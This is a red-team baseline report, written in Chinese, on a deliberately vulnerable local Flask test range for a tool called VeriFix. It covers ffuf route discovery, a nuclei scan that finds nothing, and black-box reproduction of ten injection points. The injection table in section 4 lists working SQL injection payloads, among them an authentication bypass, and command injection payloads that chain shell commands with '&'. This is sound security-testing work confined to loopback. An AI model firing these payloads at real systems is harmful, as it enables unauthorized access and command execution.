# M14 靶场红队基线报告（外部工具独立复现）

- 生成时间：2026-11-17
- 目的：回答一个评委必问的问题——**靶场里的漏洞是真打出来的，还是自己标注的？**
- 结论：**10/10 动态注入点经独立黑盒复现；11/11 路由经通用工具发现；通用扫描器（nuclei）对业务逻辑注入 0 命中**
- 执行域：本机 Windows 11 → `127.0.0.1:5055`（Flask 开发服务器），**未出网、未触碰任何外部目标**
- 证据：
  - `.evidence/redteam-baseline/RT-20261117T195125.json`，sha256 `3c97e2ab77fe6bef1b3723f407dd7967d1c21b01bef36642e6d921949e94a762`
  - `.evidence/redteam-baseline/ffuf-routes.json`，sha256 `7d7795e63f2d4c7d89349c319f23e85ec009ab87e317cd804b1263929c8fdcc5`

---

## 1. 三方工具的分工

| 工具 | 来源 | 在本报告中的角色 | 结果 |
|---|---|---|---|
| `ffuf` | 红队工具链 `RedTeam/toolkit/bin/ffuf.exe` | 暴露面发现：能不能找到接口 | **11/11 路由** |
| `nuclei` | 红队工具链 `RedTeam/toolkit/nuclei.exe` | 通用漏洞模板匹配 | **0 命中** |
| `redteam_target_baseline.py` | 本项目自研（`scripts/`） | 业务逻辑注入的黑盒复现 | **10/10 注入点** |

三者不是重复劳动：**ffuf 证明"接口找得到"，nuclei 证明"通用模板打不到"，自研脚本证明"注入确实存在"**。这个组合恰好说明 VeriFix 存在的理由。

---

## 2. 暴露面发现（ffuf，11/11）

```bash
ffuf -u http://127.0.0.1:5055/FUZZ \
     -w routes.txt -mc 200,302,405,500 -t 10 -s \
     -o ffuf-routes.json -of json
```

| 路由 | 状态码 | 路由 | 状态码 |
|---|---|---|---|
| `/health` | 200 | `/report` | 200 |
| `/user` | 200 | `/profile` | **500** |
| `/login` | **405**（需 POST） | `/ping` | 200 |
| `/search` | 200 | `/convert` | 200 |
| `/order` | **500** | `/backup` | 200 |
| `/deploy` | **405**（需 POST） | | |

两个 500 与两个 405 是重要信号：**500 意味着空参数直接进了 SQL**（错误未捕获），**405 意味着方法不匹配而非不存在**。这两类响应本身就是漏洞线索。

> 第一轮只给 `-mc 200,302,405` 时漏掉了 `/order`、`/profile`——它们返回 500。把 500 纳入匹配才拿到 11/11。

---

## 3. 通用扫描器的盲区（nuclei，0 命中）

```bash
nuclei -u http://127.0.0.1:5055 -tags sqli,exposure \
       -severity low,medium,high -rl 20 -silent -nc
# 输出：空
```

**这不是 nuclei 的问题，而是靶场的性质决定的**：10 个注入点全部是自研业务逻辑里的字符串拼接（`"SELECT ... WHERE id = '%s'" % uid`），没有 CVE 编号、没有已知指纹、没有可匹配的模板。

这条结论对答辩有直接用途：

> 通用扫描器能告诉你"有哪些接口暴露在公网"，但告诉不了你"某个接口的第 31 行把用户输入拼进了 SQL"。后者需要 SAST + 可达性判定——这正是 VeriFix 的定位。

---

## 4. 十个注入点的黑盒复现（10/10）

全部为可直接重跑的黑盒请求，判定不依赖任何内部状态：

| ID | 方法 | 路由 | payload | 基线 | 攻击后 | 判定 |
|---|---|---|---|---|---|---|
| TGT-001 | GET | `/user` | `uid=1' OR '1'='1` | rows=1 | **rows=2** | ✅ |
| TGT-002 | POST | `/login` | `username=alice' OR '1'='1'-- -` | matched=0 | **matched=2** | ✅ 绕过认证 |
| TGT-003 | GET | `/search` | `q=' OR '1'='1' --` | rows=0 | **rows=2** | ✅ |
| TGT-004 | GET | `/order` | `order_id=0 OR 1=1` | rows=1 | **rows=2** | ✅ |
| TGT-005 | GET | `/report` | `day=' OR '1'='1' --` | count=0 | **count=2** | ✅ |
| TGT-006 | GET | `/profile` | `id=0 OR 1=1` | rows=1 | **rows=2** | ✅ |
| TGT-007 | GET | `/ping` | `host=127.0.0.1 & echo VF_MARKER_<随机>` | marker=False | **marker=True** | ✅ 命令执行 |
| TGT-008 | GET | `/convert` | `name=x & exit 0` | exit=4 | **exit=0** | ✅ 命令执行 |
| TGT-009 | GET | `/backup` | `folder=data & echo VF_MARKER_<随机>` | marker=False | **marker=True** | ✅ 命令执行 |
| TGT-010 | POST | `/deploy` | `env=staging & echo VF_MARKER_<随机>` | marker=False | **marker=True** | ✅ 命令执行 |

判定口径说明：

- **SQLi** 用"行数/匹配数变大"判定，不用报错判定——报错只能证明拼接，证明不了可注入。
- **命令注入** 用**哨兵串**（`VF_MARKER_` + 6 位随机）判定：响应里出现这串，等于命令真被执行；不依赖时间盲注，也不依赖回显格式。
- **TGT-008 `/convert`** 无 stdout 回显（`subprocess.call` 不捕获），改用**退出码翻转**：基线 `exit=4`（convert 不存在），注入 `& exit 0` 后 `exit=0`——退出码被注入命令改写，即为执行证据。
- 每条 payload 都做了 URL 编码，`&` 编码为 `%26` 后才到达服务端，避免被 HTTP 层当作参数分隔。

---

## 5. 与 `ground_truth.json` 的完整对账

`ground_truth.json` 共 15 条标注，按"能否被黑盒验证"分为两组：

| 组 | 条目 | 数量 | 验证方式 | 结果 |
|---|---|---|---|---|
| **动态可复现** | TGT-001 … TGT-010（C02 SQLi ×6、C03 命令注入 ×4） | 10 | 黑盒 HTTP 请求 | **10/10 复现** |
| **静态可确认** | TGT-011/012/013（C01 依赖版本）、TGT-014/015（C05 硬编码密钥） | 5 | 读 `requirements.txt`、`app/config.py` 即可见 | 静态确认存在，**红队方式打不了** |

**为什么后 5 条红队打不了**（这一点必须主动说明，否则会被认为"漏测"）：

- C01 依赖漏洞：`requests==2.19.1`、`PyYAML==5.1`、`Jinja2==2.10.1` 的问题在**版本号**里，不在运行时行为上。要验证得做 CVE 库比对（OSV/CNVD）与**可达性判定**——是 VeriFix 的 SCA + Tracer 模块的职责。
- C05 硬编码密钥：`SECRET_KEY`、`DB_PASSWORD` 明文写在源码里，属于**文本可见**问题，不存在"被注入"或"被打穿"的验证方式，只有"扫得出来/扫不出来"。

对账结论：

```
15 条标注
├─ 10 条：外部黑盒独立复现  → 全部成立
├─  5 条：静态可见，红队不可打 → 转 SCA / 密钥扫描验证
└─  0 条：无法复现（假洞）
```

---

## 6. 边界声明（不得外推）

1. 本报告执行域为**本机 Windows + Flask 开发服务器**，不证明容器内、云上 ECS/CCE 环境同样成立。
2. `nuclei` 0 命中只说明**本次所用标签集与模板库**未覆盖该靶场，不等于 nuclei 整体对该类漏洞无效。
3. TGT-007 `/ping` 的 `ping -c 1` 是 Linux 语法，在 Windows 上基线即失败；本报告只用它做**命令拼接**证据，不声称 ping 功能正确。
4. 本次未做 CVE 库比对，C01 三条仅确认"版本号存在"，**未声称已确认存在可利用漏洞**。
5. 全程只请求 `127.0.0.1:5055`；脚本内置回环地址校验，目标非回环直接退出（退出码 4）。

---

## 7. 复现命令

```bash
# 1) 准备靶场
cd verifix-target && python init_db.py
python -m flask --app app.main run --port 5055 --host 127.0.0.1 --no-reload

# 2) 暴露面（通用工具）
ffuf -u http://127.0.0.1:5055/FUZZ -w routes.txt -mc 200,302,405,500 -t 10 -s \
     -o ffuf-routes.json -of json

# 3) 通用模板（预期 0 命中，用于说明盲区）
nuclei -u http://127.0.0.1:5055 -tags sqli,exposure -severity low,medium,high -rl 20 -silent -nc

# 4) 注入复现（本项目脚本，10 条黑盒判定）
python scripts/redteam_target_baseline.py --base http://127.0.0.1:5055 \
       --out .evidence/redteam-baseline
```

脚本退出码：`0=全部复现 / 2=有未复现项 / 4=目标非回环被拒`。

---

## 8. 可以直接写进材料的句子

> 靶场 15 条标注中，10 条动态注入点已由**独立黑盒请求**逐条复现（SQLi 用行数变化判定、命令注入用哨兵串判定），11 条路由由 `ffuf` 完整发现；同一靶场上通用模板扫描器（`nuclei`）**0 命中**——这说明业务逻辑型注入不在通用扫描器的能力范围内，需要 SAST + 可达性判定来补位。

这句话同时完成了三件事：证明靶场是真的、证明红队基线跑过、**顺带论证了 VeriFix 的必要性**。
